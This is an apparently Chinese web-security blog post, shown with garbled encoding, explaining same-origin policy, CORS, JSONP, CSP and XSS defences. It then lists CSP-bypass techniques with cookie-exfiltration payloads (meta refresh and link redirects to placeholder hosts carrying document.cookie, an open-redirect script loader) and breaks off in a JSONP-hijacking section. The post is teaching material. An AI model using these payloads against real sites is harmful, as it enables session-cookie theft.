    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="åŒæºç­–ç•¥ä¸è·¨åŸŸ"><a href="#åŒæºç­–ç•¥ä¸è·¨åŸŸ" class="headerlink" title="åŒæºç­–ç•¥ä¸è·¨åŸŸ"></a>åŒæºç­–ç•¥ä¸è·¨åŸŸ</h1><h2 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h2><h3 id="åŒæºçš„å®šä¹‰"><a href="#åŒæºçš„å®šä¹‰" class="headerlink" title="åŒæºçš„å®šä¹‰"></a>åŒæºçš„å®šä¹‰</h3><p>è‹¥ä¸¤ä¸ªURL åè®®ï¼Œç«¯å£ï¼Œhostéƒ½ç›¸åŒï¼Œåˆ™è¿™ä¸¤ä¸ªURLåŒæºã€‚<br>è¿™ä¸ªæ–¹æ¡ˆå«åšâ€œåè®®/ä¸»æœº/ç«¯å£å…ƒç»„â€ï¼Œæˆ–è€…ç›´æ¥æ˜¯ â€œå…ƒç»„â€</p><p>åŒæºç­–ç•¥åˆåˆ†ä¸ºDOMåŒæºç­–ç•¥(ç¦æ­¢å¯¹ä¸åŒæºçš„é¡µé¢çš„DOMè¿›è¡Œæ“ä½œ)å’ŒXMLHttpRequest(ç¦æ­¢XHRå¯¹è±¡é¡¹ä¸åŒæºçš„æœåŠ¡å™¨åœ°å€å‘èµ·HTTPè¯·æ±‚)åŒæºç­–ç•¥</p><h3 id="åŒæºç­–ç•¥çš„ä½œç”¨"><a href="#åŒæºç­–ç•¥çš„ä½œç”¨" class="headerlink" title="åŒæºç­–ç•¥çš„ä½œç”¨"></a>åŒæºç­–ç•¥çš„ä½œç”¨</h3><p>é™åˆ¶ä¸€ä¸ªJSè„šæœ¬å¯¹ä¸åŒæºçš„URLè¿›è¡Œæ“ä½œã€‚</p><p>è¿™ä¹ˆè¯´å¯èƒ½ä¼šæœ‰ç‚¹æŠ½è±¡ï¼Œé‚£ä¸å¦‚çœ‹çœ‹ä¸‹é¢çš„ä¾‹å­:</p><p>1.å¦‚æœæ²¡æœ‰DOMåŒæºç­–ç•¥ï¼Œå°±æ„å‘³ç€ä¸€ä¸ªé¡µé¢å¯ä»¥å¯¹ä»»æ„é¡µé¢çš„DOMè¿›è¡Œæ“ä½œã€‚é‚£ä¹ˆå°±ä¼šå¯¼è‡´ä»¥ä¸‹å®‰å…¨é—®é¢˜:<br>åšä¸€ä¸ªå‡ç½‘ç«™ï¼Œå¹¶æ’å…¥ä¸€ä¸ªå æ»¡å…¨é¡µé¢çš„iframeæŒ‡å‘ä¸€ä¸ªç™»é™†ç•Œé¢å¦‚é“¶è¡Œç™»å½•ç•Œé¢ã€‚ç”¨æˆ·è¿›æ¥åä¼šå‘ç°é™¤äº†åŸŸåä¸åŒï¼Œå…¶ä»–éƒ½å’Œæ­£å¸¸çš„é“¶è¡Œç™»é™†ç•Œé¢ä¸€è‡´ã€‚è‹¥ç”¨æˆ·è¾“å…¥äº†è´¦å·å¯†ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è·¨åŸŸè¯»å–åˆ°é“¶è¡Œç™»é™†ç•Œé¢çš„domæ ‘ï¼Œä»è€Œè¯»å–ç”¨æˆ·è¾“å…¥çš„è´¦å·å¯†ç ã€‚</p><p>2.å¦‚æœæ²¡æœ‰XMLHttpRequestï¼Œå°±æ„å‘³ç€å¯ä»¥ä¸€ä¸ªé¡µé¢å¯ä»¥å‘ä»»æ„é¡µé¢å‘èµ·HTTPè¯·æ±‚ã€‚é‚£ä¹ˆå°±ä¼šå¯¼è‡´ä»¥ä¸‹å®‰å…¨é—®é¢˜:<br>å½“ä¸€ä¸ªç”¨æˆ·ç™»é™†äº†æŸä¸ªç³»ç»Ÿï¼Œå¦‚é“¶è¡Œä¸ªäººç³»ç»Ÿï¼Œæ­¤æ—¶é“¶è¡Œç½‘ç«™ä¼šç»™ç”¨æˆ·è¿”å›cookieã€‚å¦‚æœç”¨æˆ·æ­¤æ—¶è®¿é—®äº†æˆ‘ä»¬çš„æ¶æ„ç½‘ç«™ï¼Œå°±ä¼šæ‰§è¡Œæˆ‘ä»¬æ¶æ„ç½‘ç«™ä¸­çš„æ¶æ„AJAXä»£ç ï¼Œæ­¤AJAXä»£ç ä¼šå‘é“¶è¡Œç½‘ç«™å‘èµ·HTTPè¯·æ±‚ï¼Œæ¯”å¦‚å‘èµ·æŸ¥è¯¢è´¦æˆ·ä½™é¢çš„è¯·æ±‚ï¼ˆæ­¤æ—¶ä¼šé»˜è®¤é™„å¸¦ç”¨æˆ·çš„cookieï¼‰ã€‚é“¶è¡Œé¡µé¢å‘ç°cookieæ— è¯¯ï¼Œå°±ä¼šè¿”å›è¯·æ±‚çš„æ•°æ®:è´¦æˆ·ä½™é¢ï¼Œé€ æˆæ•°æ®æ³„éœ²ã€‚</p><h2 id="è·¨åŸŸ"><a href="#è·¨åŸŸ" class="headerlink" title="è·¨åŸŸ"></a>è·¨åŸŸ</h2><p>ä¸Šé¢æˆ‘ä»¬è¯´äº†åŒæºç­–ç•¥ä¸­ï¼Œä¸€ä¸ªé¡µé¢ä¸èƒ½å¯¹ä¸åŒæºçš„é¡µé¢è¿›è¡Œæ“ä½œã€‚ä½†æ˜¯åœ¨å®é™…æƒ…å†µä¸­ï¼Œè¿˜æ˜¯æœ‰ä¸€äº›jsæ ‡ç­¾èƒ½æ‘†è„±è¿™ç§æŸç¼š,å¦‚scriptæ ‡ç­¾å°±èƒ½é€šè¿‡srcå±æ€§è·å–ä¸åŒæºé¡µé¢ä¸Šçš„jsä»£ç ï¼Œiframeèƒ½åµŒå…¥ä¸åŒæºç«™ç‚¹çš„èµ„æºç­‰ç­‰ã€‚<br>è¿™æ ·çš„æ ‡ç­¾æœ‰å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;...&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;img&gt; &#x2F; &lt;video&gt; &#x2F; &lt;audio&gt;</span><br><span class="line">&lt;object&gt; &lt;embed&gt; å’Œ &lt;applet&gt; çš„æ’ä»¶</span><br><span class="line">@font-face</span><br><span class="line">&lt;frame&gt; å’Œ &lt;iframe&gt;</span><br></pre></td></tr></table></figure><p>ä½†ä»…ä»…æ˜¯è¿™æ ·ï¼Œæœ‰äº›æ—¶å€™è¿˜æ˜¯æ— æ³•è¾¾åˆ°ä¸šåŠ¡çš„éœ€æ±‚ï¼Œæˆ‘ä»¬æœ‰æ—¶éœ€è¦çªç ´è¿™ç§é™åˆ¶æ¥è¾¾åˆ°ä¸šåŠ¡éœ€æ±‚ï¼Œä¹Ÿå°±æ˜¯é¿å¼€åŒæºç­–ç•¥ï¼Œä»¥ä¸‹æ˜¯å‡ ç§è§£å†³æ–¹æ¡ˆã€‚</p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>CORSï¼Œå³è·¨åŸŸèµ„æºå…±äº«ï¼Œå®ƒæ˜¯ä¸€ä¸ªW3Cæ ‡å‡†ï¼Œå®šä¹‰äº†å¿…é¡»è®¿é—®è·¨åŸŸèµ„æºæ—¶ï¼Œæµè§ˆå™¨å’ŒæœåŠ¡å™¨è¯¥å¦‚ä½•åå•†ã€‚<br>å…¶å®è´¨å°±æ˜¯ä»¥AJAXä¸ºè½½ä½“ï¼Œä½¿ç”¨è‡ªå®šä¹‰HTTPå¤´è®©æµè§ˆå™¨ä¸æœåŠ¡å™¨è¿›è¡Œåå•†ï¼Œä»è€Œå†³å®šè·¨åŸŸè¯·æ±‚æ˜¯å¦åº”è¯¥æˆåŠŸã€‚<br>æ‰€ä»¥å®ç°CORSé€šä¿¡çš„å…³é”®æ˜¯æœåŠ¡å™¨æ˜¯å¦å®ç°äº†CORSæ¥å£ã€‚</p><p>å¦å¤–ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒCORSï¼Œæ¯”å¦‚IE6,IE7,Opera min ä¸æ”¯æŒCORSã€‚</p><h4 id="å®ç°åŸç†"><a href="#å®ç°åŸç†" class="headerlink" title="å®ç°åŸç†"></a>å®ç°åŸç†</h4><p>æµè§ˆå™¨æŠŠCORSçš„è¯·æ±‚åˆ†æˆä¸¤ç±»:ç®€å•è¯·æ±‚ä¸éç®€å•è¯·æ±‚</p><p>ç®€å•è¯·æ±‚:<br>æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼Œå³ä¸ºç®€å•è¯·æ±‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚æ–¹æ³•æ˜¯ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ä¹‹ä¸€ï¼š</span><br><span class="line">HEAD</span><br><span class="line">GET</span><br><span class="line">POST</span><br><span class="line"></span><br><span class="line">ä¸”HTTPçš„å¤´ä¿¡æ¯ä¸è¶…å‡ºä»¥ä¸‹å‡ ç§å­—æ®µï¼š</span><br><span class="line">Accept</span><br><span class="line">Accept-Language</span><br><span class="line">Content-Language</span><br><span class="line">Last-Event-ID</span><br><span class="line">Content-Typeï¼šåªé™äºä¸‰ä¸ªå€¼ application&#x2F;x-www-form-urlencodedã€multipart&#x2F;form-dataã€text&#x2F;plain</span><br></pre></td></tr></table></figure><p>åªè¦ä¸æ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œéƒ½ä¸ºéç®€å•è¯·æ±‚ã€‚</p><p>å¯¹äºç®€å•è¯·æ±‚ï¼Œå…¶å®ç°åŸç†å¦‚ä¸‹:</p><p>1.åœ¨è¯·æ±‚å¤´ä¸­åŠ ä¸€ä¸ªé¢å¤–å¤´:Origin, å…¶åŒ…å«å‘å‡ºè¯·æ±‚çš„é¡µé¢çš„åè®®ï¼ŒåŸŸåï¼Œç«¯å£ï¼ŒæœåŠ¡å™¨ä»¥æ­¤æ¥åˆ¤æ–­æ˜¯å¦ç»™äºˆå“åº”ã€‚<br>2.æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œåˆ¤åˆ«è¯¥OriginæŒ‡å‘çš„ç«™ç‚¹èƒ½å¦è·¨åŸŸã€‚è‹¥èƒ½è·¨åŸŸï¼Œå°±åœ¨ Access-Control-Allow-Origin å¤´éƒ¨ä¸­å›å‘ç›¸åŒçš„æºä¿¡æ¯ï¼ˆå¦‚æœæ˜¯å…¬å…±èµ„æºï¼Œå¯ä»¥å›å‘ * ï¼‰ï¼›è‹¥ä¸èƒ½è·¨åŸŸï¼Œåˆ™æ²¡æœ‰è¿™ä¸ªå¤´éƒ¨æˆ–è€…æºä¿¡æ¯ä¸åŒ¹é…ï¼ˆå³Access-Control-Allow-Originå†…å®¹é*ä¸”ä¸Originä¸ç¬¦ï¼‰<br>3.åŒæ—¶å¦‚æœæœåŠ¡å™¨è¿”å›çš„å¤´ä¸­æœ‰ Access-Control-Allow-Credentials: true ï¼Œåˆ™è¯´æ˜å¯ä»¥è·¨åŸŸå‘æœåŠ¡å™¨å‘é€å¸¦æœ‰cookieçš„HTTPè¯·æ±‚ã€‚</p><p>å¯¹äºéç®€å•è¯·æ±‚ï¼Œå®ƒä¼šå®ç°è¿›è¡Œé¢„æ£€ï¼Œå…¶åŸç†å¦‚ä¸‹:<br>1.è¿›è¡Œé¢„æ£€ï¼Œä»¥OPTIONSæ–¹æ³•å‘æœåŠ¡å™¨å‘é€Originå¤´éƒ¨ï¼ŒAccess-Control-Request-Methodå¤´éƒ¨ï¼ˆæ¥ä¸‹æ¥çš„è¯·æ±‚æ–¹æ³•ï¼Œå¦‚POSTï¼‰ï¼ŒAccess-Control-Request-Headersï¼ˆè‡ªå®šä¹‰å¤´éƒ¨ä¿¡æ¯ï¼Œå¯é€‰ï¼‰<br>2.æœåŠ¡å™¨å“åº”ï¼Œæœ‰å¦‚ä¸‹å¤´:Access-Control-Allow-Origin,Access-Control-Allow-Methods(å…è®¸çš„è¯·æ±‚æ–¹æ³•)ï¼ŒAccess-Control-Allow-Headersï¼ˆå…è®¸çš„è‡ªå®šä¹‰å¤´éƒ¨ä¿¡æ¯ï¼‰ï¼ŒAccess-Control-Max-Ageï¼ˆåº”è¯¥å°†é¢„æ£€è¯·æ±‚ç¼“å­˜å¤šé•¿æ—¶é—´ï¼Œä»¥ç§’ä¸ºå•ä½ï¼‰<br>3.é€šè¿‡é¢„æ£€è¯·æ±‚åï¼Œä»¥åæ¯æ¬¡æµè§ˆå™¨çš„CORSè¯·æ±‚éƒ½ä¼šå’Œç®€å•è¯·æ±‚ä¸€æ ·ã€‚</p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>æˆ‘ä»¬ä¸å¦¨é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥çª¥è§†JSONPçš„å®ç°åŸç†ã€‚</p><p>æˆ‘ä»¬æœ‰å¦‚ä¸‹æ–‡ä»¶test.html</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;HI&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            var fun1&#x3D;function(data)&#123;</span><br><span class="line">                alert(data)</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">        &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;192.168.111.1&#x2F;a.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>å…¶åŒ…å«çš„a.jså¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fun1(&quot;remote data&quot;);</span><br></pre></td></tr></table></figure><p>è®¿é—®test.htmlï¼ŒæˆåŠŸè§¦å‘å¼¹çª—ï¼Œæˆ‘ä»¬å°†test.htmlä¸­çš„fun1å‡½æ•°ç§°ä¸ºå›è°ƒå‡½æ•°</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322211050387.png" alt="image-20210322211050387"></p><p>äºæ˜¯å°±å‡ºç°äº†åˆ©ç”¨è¿™ç§åŸç†æ¥å®ç°è·¨åŸŸä¼ è¾“æ•°æ®çš„æ–¹æ³•ï¼šJSONP</p><p>ä¸‹é¢è¯´è¯´JSONPçš„å…·ä½“å®ç°æµç¨‹:</p><p>å®¢æˆ·ç«¯:<br>1.å®šä¹‰è·å–æ•°æ®åçš„å›è°ƒå‡½æ•°<br>2.åŠ¨æ€ç”ŸæˆæœåŠ¡ç«¯JSè¿›è¡Œå¼•ç”¨çš„ä»£ç </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å…³äºæ­¤å¤„ç¬¬2ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥è¯´é“è¯´é“ã€‚</span><br><span class="line">æˆ‘ä»¬å†ç”¨è¿™ä¸ªæ–¹æ³•å®ç°è·¨åŸŸæ—¶ï¼Œæ€ä¹ˆè®©è¿œç¨‹JSçŸ¥é“æˆ‘ä»¬æœ¬åœ°çš„å›è°ƒå‡½æ•°å«ä»€ä¹ˆåå­—ï¼Ÿ</span><br><span class="line">è¿™å°±éœ€è¦é€šè¿‡ä¸€äº›æ‰‹æ®µåŠ¨æ€ç”ŸæˆæœåŠ¡ç«¯çš„JSä»£ç äº†ã€‚</span><br><span class="line">æ¯”å¦‚æˆ‘ä»¬å¯ä»¥é€šè¿‡getå‚æ•°æ¥æ§åˆ¶å…¶è¿”å›çš„æœ¬åœ°å›è°ƒå‡½æ•°åï¼Œå¦‚: http:&#x2F;&#x2F;a.com?callback&#x3D;fun1</span><br></pre></td></tr></table></figure><p>æœåŠ¡ç«¯:<br>è¿”å›ç”±å›è°ƒå‡½æ•°ååŒ…è£¹çš„JSONæ•°æ®ï¼Œå¦‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fun1(&#123;</span><br><span class="line">&quot;key1&quot;:&quot;value1&quot;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸ºä»€ä¹ˆè¦ç‰¹åˆ«å¼ºè°ƒæ˜¯JSONå‘¢ï¼Ÿå› ä¸ºJSONä¸ä»…å¯ä»¥ç®€æ´çš„è¡¨è¿°å¤æ‚çš„æ•°æ®ï¼Œè€Œä¸”JSåŸç”Ÿæ”¯æŒJSONï¼Œå¯ä»¥åœ¨å®¢æˆ·ç«¯è‡ªç”±å¤„ç†JSONæ•°æ®ï¼Œæ‰€ä»¥æœåŠ¡ç«¯å¤šä¼ å›JSONæ•°æ®ï¼ŒJSONPè¿™ä¸ªåå­—ä¹Ÿæ˜¯è¿™ä¹ˆæ¥çš„ã€‚</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><p>CSPï¼Œå³å†…å®¹å®‰å…¨ç­–ç•¥ã€‚å®ƒé€šè¿‡ç™½åå•ç­–ç•¥ï¼Œå‘Šè¯‰å®¢æˆ·ç«¯å“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œã€‚<br>åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCSPç›®å‰æœ‰1.0 2.0 3.0 ç‰ˆæœ¬ï¼Œæ¯ä¸ªç‰ˆæœ¬çš„è§„åˆ™éƒ½æœ‰ä¸åŒ</p><h2 id="CSPè§„åˆ™"><a href="#CSPè§„åˆ™" class="headerlink" title="CSPè§„åˆ™"></a>CSPè§„åˆ™</h2><p>CSPé€šè¿‡å®šä¹‰ä¸€ç³»åˆ—è§„åˆ™æ¥å®ç°å®‰å…¨ç®¡ç†ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹ä¸€æ¡CSPè§„åˆ™çš„èŒƒä¾‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src https:&#x2F;&#x2F;host1.com https:&#x2F;&#x2F;host2.com; frame-src &#39;none&#39;; object-src &#39;none&#39;</span><br><span class="line">å¤šä¸ªCSPæŒ‡ä»¤é—´ç”¨åˆ†å·éš”å¼€ï¼Œå¤šä¸ªæŒ‡ä»¤å€¼ä¹‹é—´ç”¨ç©ºæ ¼éš”å¼€</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯å„ä¸ªæŒ‡ä»¤åŠå…¶æŒ‡ä»¤å€¼çš„æ•ˆæœ</p><p>æ‘˜è‡ª<a href="https://blog.csdn.net/qq_37943295/article/details/79978761">https://blog.csdn.net/qq_37943295/article/details/79978761</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214229302.png" alt="image-20210322214229302"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214238476.png" alt="image-20210322214238476"></p><h2 id="å¯ç”¨CSP"><a href="#å¯ç”¨CSP" class="headerlink" title="å¯ç”¨CSP"></a>å¯ç”¨CSP</h2><p>é‚£ä¹ˆå¦‚ä½•å¯ç”¨CSPå‘¢ï¼Ÿæœ‰ä¸¤ç§æ–¹å¼</p><p>1.åœ¨HTTPå¤´æ·»åŠ <br>åœ¨HTTPå¤´å“åº”æ·»åŠ content-security-policyå¤´å¹¶å†™å…¥CSPè§„åˆ™ä»¥åï¼Œå°±èƒ½å¯ç”¨CSPäº†</p><p>å›¾å¼•ç”¨äº<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">http://www.ruanyifeng.com/blog/2016/09/csp.html</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210322214736472.png" alt="image-20210322214736472"></p><p>2.åœ¨metaæ ‡ç­¾é‡Œæ·»åŠ <br>å‘å†…æ·»åŠ å¦‚ä¸‹å†…å®¹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br><span class="line">å³å¯</span><br></pre></td></tr></table></figure><h1 id="ä¸€äº›å…¶ä»–XSSä¿æŠ¤æœºåˆ¶"><a href="#ä¸€äº›å…¶ä»–XSSä¿æŠ¤æœºåˆ¶" class="headerlink" title="ä¸€äº›å…¶ä»–XSSä¿æŠ¤æœºåˆ¶"></a>ä¸€äº›å…¶ä»–XSSä¿æŠ¤æœºåˆ¶</h1><h2 id="X-Frame"><a href="#X-Frame" class="headerlink" title="X-Frame"></a>X-Frame</h2><p>X-Frame-Options æ˜¯ä¸€ä¸ªå“åº”å¤´ï¼ŒæŒ‡å®šæ­¤é¡µé¢èƒ½å¦åœ¨&lt;frame&gt;æˆ–è€…&lt;iframe&gt;ä¸­æ’å…¥.<br>ä»–æœ‰ä¸‰ä¸ªå¯é€‰å€¼:</p><ul><li><p>DENY</p><p>é¡µé¢ä¸èƒ½è¢«åµŒå…¥åˆ°ä»»ä½•iframeæˆ–frameä¸­</p></li><li><p>SAMEORIGIN</p><p>é¡µé¢åªèƒ½è¢«æœ¬ç«™é¡µé¢åµŒå…¥åˆ°iframeæˆ–è€…frameä¸­</p></li><li><p>ALLOW-FROM uri</p><p>è¡¨ç¤ºè¯¥é¡µé¢å¯ä»¥åœ¨æŒ‡å®šæ¥æºçš„ frame ä¸­å±•ç¤ºã€‚</p></li></ul><h2 id="XSS-auditor"><a href="#XSS-auditor" class="headerlink" title="XSS auditor"></a>XSS auditor</h2><h2 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h2><p>httponly æ˜¯ä¸€ä¸ªé’ˆå¯¹cookieçš„ä¿æŠ¤æœºåˆ¶ã€‚<br>å…¶å®ç°åŸç†æ˜¯åœ¨responseä¸­å¯¹æŸä¸€é¡¹cookieè®¾ç½®ä¸ºHTTPONLY=trueï¼Œä»è€Œä½¿è¯¥cookieä¸èƒ½è¢«document.cookie è¯»å–ã€‚</p><p>æˆ‘ä»¬éšä¾¿æ‰¾ä¸ªç½‘ç«™ï¼Œå‘ç°å…¶captch_session_v2å¼€å¯äº†httponly</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210323115121425.png" alt="image-20210323115121425"></p><p>éšåæˆ‘ä»¬é€šè¿‡document.cookieå°è¯•å»è¯»å–aptch_session_v2çš„å€¼ï¼Œå‘ç°å…¶å€¼å¹¶æ²¡æœ‰å‡ºç°åœ¨è¿”å›å†…å®¹ä¸­<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210323115228944.png" alt="image-20210323115228944"></p><h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h2><p>htmlspecialcharsæ˜¯ä¸€ä¸ªphpå‡½æ•°ï¼Œå®ƒå¯ä»¥å°†ä¸€äº›æ•æ„Ÿå­—ç¬¦è½¬ä¹‰</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp; (AND) &#x3D;&gt; &amp;</span><br><span class="line">&quot; (åŒå¼•å·) &#x3D;&gt; &quot; (å½“ENT_NOQUOTESæ²¡æœ‰è®¾ç½®çš„æ—¶å€™) </span><br><span class="line">&#39; (å•å¼•å·) &#x3D;&gt; &amp;#039; (å½“ENT_QUOTESè®¾ç½®) </span><br><span class="line">&lt; (å°äºå·) &#x3D;&gt; &lt; </span><br><span class="line">&gt; (å¤§äºå·) &#x3D;&gt; &gt; </span><br></pre></td></tr></table></figure><h1 id="æ”»å‡»æ‰‹æ®µ"><a href="#æ”»å‡»æ‰‹æ®µ" class="headerlink" title="æ”»å‡»æ‰‹æ®µ"></a>æ”»å‡»æ‰‹æ®µ</h1><h2 id="bypass-csp"><a href="#bypass-csp" class="headerlink" title="bypass csp"></a>bypass csp</h2><p>cspï¼Œæ˜¯å¯ä»¥è¢«bypassçš„ã€‚æˆ‘ä»¬æ¥ä¸‹æ¥å°±æƒ³åŠæ³•bypass cspæ¥å›ä¼ cookie</p><p>1</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;none&#39;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡metaæ ‡ç­¾å®ç°é‡å®šå‘</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.xxx.com&#x2F;x.php?cookie&#x3D;[cookie]&quot;&gt;</span><br></pre></td></tr></table></figure><p>å³ï¼Œ1ç§’åè·³è½¬è‡³æŒ‡å®šurl</p><p>2</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script-src â€˜selfâ€™ â€˜unsafe-inlineâ€™</span><br></pre></td></tr></table></figure><p>å¼€æ”¾äº†å†…è”è„šæœ¬ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡window.location,windows.openæˆ–è€…metaæ ‡ç­¾å®ç°é¡µé¢è·³è½¬ã€‚ä¹Ÿå¯ä»¥é€šè¿‡åŠ¨æ€åˆ›å»ºå…ƒç´ å®ç°è·³è½¬</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a &#x3D; document.createElement(&quot;a&quot;);</span><br><span class="line">a.href&#x3D;&#39;http:&#x2F;&#x2F;www.baidu.com&#39;+document.cookie;</span><br><span class="line">a.click();</span><br></pre></td></tr></table></figure><p>3</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;self&#39;; script-src &#39;self&#39;</span><br></pre></td></tr></table></figure><p>é™åˆ¶äº†åªèƒ½åŠ è½½æœ¬åŸŸJSè„šæœ¬ï¼ŒåŒæ—¶ç¦æ­¢äº†å†…è”è„šæœ¬æ‰§è¡Œã€‚<br>ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ¶æ„JSæ–‡ä»¶ï¼Œä¸Šä¼ åå¦‚æœæˆ‘ä»¬çŸ¥é“æ­¤JSæ–‡ä»¶ä¸Šä¼ ä½ç½®ä¸æ–‡ä»¶åä¸”ä¸Šä¼ çš„ä½ç½®æ˜¯æœ¬åŸŸï¼Œç„¶åé€šè¿‡XSSå®ç°åŠ è½½æ­¤æ¶æ„JSæ–‡ä»¶ã€‚</p><p>å¦å¤–åœ¨CSP1.0ç‰ˆæœ¬ä¸­ï¼Œè¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œè·³è½¬(ç°åœ¨ä¸å’‹å¥½ç”¨äº†)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxx.cn&quot;&gt; (H5é¢„åŠ è½½)</span><br><span class="line">&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;xxx.cn&quot;&gt; ï¼ˆDNSé¢„åŠ è½½ï¼‰</span><br></pre></td></tr></table></figure><p>4</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script-src http:&#x2F;&#x2F;www.a.com&#x2F;b&#x2F; </span><br></pre></td></tr></table></figure><p>é™åˆ¶äº†åªèƒ½ä»æŸç‰¹å®šè·¯å¾„å»åŠ è½½JSè„šæœ¬<br>å¯¹æ­¤ä¸€èˆ¬çš„è§£å†³æ–¹æ³•æ˜¯çœ‹çœ‹æ­¤ç›®å½•ä¸‹æœ‰æ²¡æœ‰å¯æ§é‡å®šå‘çš„æ–‡ä»¶ï¼Œæ¯”å¦‚è¿™ç§</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#x2F;302.php</span><br><span class="line">&lt;?php Header(&quot;location: &quot;.$_GET[&#39;url&#39;])?&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±å¯ä»¥æ’å…¥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;b&#x2F;302.php?url&#x3D;http:&#x2F;&#x2F;a.com&#x2F;upload&#x2F;a.js&quot;&gt;  </span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>å»åŠ è½½æˆ‘ä»¬ä¸Šä¼ çš„JSè„šæœ¬ï¼ˆä¸Šä¼ ç‚¹è‡ªå·±æ‰¾ï¼‰</p><h2 id="JSONP-åŠ«æŒ"><a href="#JSONP-åŠ«æŒ" class="headerlink" title="JSONP åŠ«æŒ"></a>JSONP åŠ«æŒ</h2><p>ç®€å•è¯´ä¸€è¯´</p><p>é¦–å…ˆå­˜åœ¨ç½‘ç«™Bï¼Œå®ƒåŒ…å«ç™»å½•ç”¨æˆ·çš„ID,passwdç­‰æ•æ„Ÿä¿¡æ¯ã€‚ä¸”æœ‰é¡µé¢<a href="http://b.com/user?callback=">http://B.com/user?callback=</a>  ç”¨æ¥è¿›è¡ŒJSONPè·¨åŸŸæ•°æ®ä¼ 